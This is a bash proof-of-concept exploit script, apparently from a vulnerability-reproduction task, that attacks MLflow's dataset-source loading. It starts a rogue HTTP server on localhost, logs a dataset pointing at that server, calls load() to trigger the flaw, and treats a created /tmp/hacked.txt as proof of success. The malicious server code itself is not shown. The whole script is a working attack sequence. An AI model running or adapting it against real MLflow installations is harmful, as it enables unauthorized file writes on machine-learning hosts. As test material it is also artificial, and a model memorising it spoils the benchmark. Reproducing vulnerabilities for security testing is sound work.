#!/bin/bash

# Install required dependencies
echo "[*] Installing required dependencies..."
python -m pip install flask pandas
python -m pip install -e ../../../codebase

# Start the rogue HTTP server
echo "[*] Starting the rogue HTTP server..."
python exploit_server.py &
SERVER_PID=$!
sleep 2  # Wait for server to start

# Malicious dataset source URL
DATASET_URL="http://localhost:4444"

# Trigger the vulnerability
echo "[*] Triggering the exploit..."
python -c "
import mlflow.data
import pandas as pd
from mlflow.data.pandas_dataset import PandasDataset

# Load malicious dataset
df = pd.read_csv('${DATASET_URL}')
dataset = mlflow.data.from_pandas(df, source='${DATASET_URL}')

# Perform logging to trigger the vulnerability
with mlflow.start_run():
    mlflow.log_input(dataset, context='training')

# Retrieve and load the dataset source
run = mlflow.get_run(mlflow.last_active_run().info.run_id)
dataset_info = run.inputs.dataset_inputs[0].dataset
dataset_source = mlflow.data.get_source(dataset_info)
dataset_source.load()
"

# Verify the exploit
if [ -f /tmp/hacked.txt ]; then
    echo "[*] Exploit successful: /tmp/hacked.txt created!"
else
    echo "[*] Exploit failed."
fi

# Cleanup
echo "[*] Cleaning up..."
kill $SERVER_PID
rm -rf mlruns
